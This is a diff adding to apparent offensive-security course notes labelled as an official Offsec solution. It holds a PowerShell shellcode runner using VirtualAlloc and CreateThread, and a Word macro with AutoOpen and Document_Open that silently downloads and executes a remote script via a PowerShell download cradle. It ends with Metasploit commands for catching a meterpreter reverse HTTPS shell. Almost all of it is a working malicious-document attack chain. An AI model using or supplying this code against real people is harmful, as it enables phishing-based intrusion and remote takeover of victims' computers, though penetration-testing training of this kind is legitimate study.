@@ -49,3 +49,58 @@ $thandle=[Shell32]::CreateThread(0,0,$addr,0,0,0);
 Note:
 * Can remove all the `[return: MarshalAs(...)]`
 * Sometimes the DLL might not be correct, refer back to MSDN for the final confirmation
+
+Official Solution from Offsec:
+
+```powershell
+$Kernel32 = @"
+using System;
+using System.Runtime.InteropServices;
+public class Kernel32 {
+  [DllImport("kernel32")]
+  public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
+
+  [DllImport("kernel32", CharSet=CharSet.Ansi)]
+  public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
+
+  [DllImport("kernel32.dll", SetLastError=true)]
+  public static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);
+}
+"@
+
+Add-Type $Kernel32
+[Byte[]] $buf = SHELLCODE HERE
+$size = $buf.Length
+[IntPtr]$addr = [Kernel32]::VirtualAlloc(0,$size,0x3000,0x40);
+[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $addr, $size)
+$thandle=[Kernel32]::CreateThread(0,0,$addr,0,0,0);
+[Kernel32]::WaitForSingleObject($thandle, [uint32]"0xFFFFFFFF")
+```
+
+Add this to a Microsoft Word Macro AutoOpen():
+```vba
+Sub MyMacro()
+  Dim str As String
+  str = "powershell (New-Object System.Net.WebClient).DownloadString('http://IP/run.ps1') | IEX"
+  Shell str, vbHide
+End Sub
+
+Sub Document_Open()
+  MyMacro
+End Sub
+
+Sub AutoOpen()
+  MyMacro
+End Sub
+```
+
+Finally prepare for incoming shell:
+
+```
+msfconsole -q
+use multi/handler
+set payload windows/x64/meterpreter/reverse_https
+set lhost IP
+set lport PORT
+exploit
+```
